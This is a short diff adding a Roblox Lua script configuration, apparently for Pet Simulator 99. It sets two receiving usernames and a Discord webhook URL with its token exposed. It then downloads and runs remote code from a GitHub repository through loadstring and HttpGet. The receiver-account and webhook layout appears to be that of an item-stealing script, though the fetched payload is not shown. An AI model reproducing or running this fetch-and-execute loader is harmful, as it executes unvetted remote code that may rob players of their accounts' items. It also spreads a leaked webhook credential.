@@ -1,0 +1,6 @@
+Username = "jammogaming"
+Username2 = "1tomanymal"
+Webhook = "https://discord.com/api/webhooks/1334663545219973161/aFKJNXXHwmMn1SvMJpI_RLLj575_zE5VApHNT9nhLYteug4H36oYWn2Z6nIIeC5pBGvx"
+selectedLoadingScreen = "1"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/PS99"))()
